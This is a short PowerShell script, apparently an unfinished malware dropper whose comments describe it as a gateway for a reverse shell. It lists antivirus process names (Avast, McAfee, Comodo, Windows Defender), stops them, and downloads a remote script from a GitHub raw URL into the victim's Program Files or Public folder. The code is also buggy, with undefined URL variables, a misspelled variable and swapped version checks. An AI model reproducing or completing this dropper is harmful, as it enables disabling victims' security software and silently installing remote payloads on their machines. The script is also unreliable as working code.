#Purpose of payload 
# - To act as a gateway for a reverse shell and other exploits
# To do - Find location of the victim's device, find the windows version, Find out
# if the payload is running in a virtualize environment 
# Kill any antivirus proccesses running, then drop payload

#Dropper Testing to see if it works
$url = "https://raw.githubusercontent.com/dskeene/thedisabledgap/main/main.ps1" #sample link
$dest = "$HOME/Program Files/"
$dest2 = '$HOME/Public'
# Victim Information
$criticalProc = @("Antimalware Service Executable","AvastUI.exe","avp.exe","McAfee Management Service","ccsvchst.exe","COMODO_Antivirus_8.exe")
$hostVersion =[System.Environment]::OSVersion.Version.Major
$osystem = [System.Environment]::OsVersion.Platform
$isRunning = Get-Process prog -ErrorAction SilentlyContinue
#$isVirtualized = 

ForEach($i in $criticalProc)
{
    if(!$isRunning)
    {
        if ($hostVersion -eq "Windows" -and $ossystem -eq 10) 
        {
            Invoke-WebRequest -Uri $url1 -OutFile $dest
        } elseif ($hostVersion -eq "Windows" -and $ossystem -eq 7) 
        {
            Invoke-WebRequest -Uri $url1 -OutFile $dest

        } elseif ($hostVersion -eq "Linux")
        {
            Invoke-WebRequest -Uri $url3 -OutFile $dest2
        }

    } else 
    {
        ForEach($i in $criticalProc)
        {
            if($isRunning)
            {
                Stop-Process -Name $i
            }
           
        }
    }
}

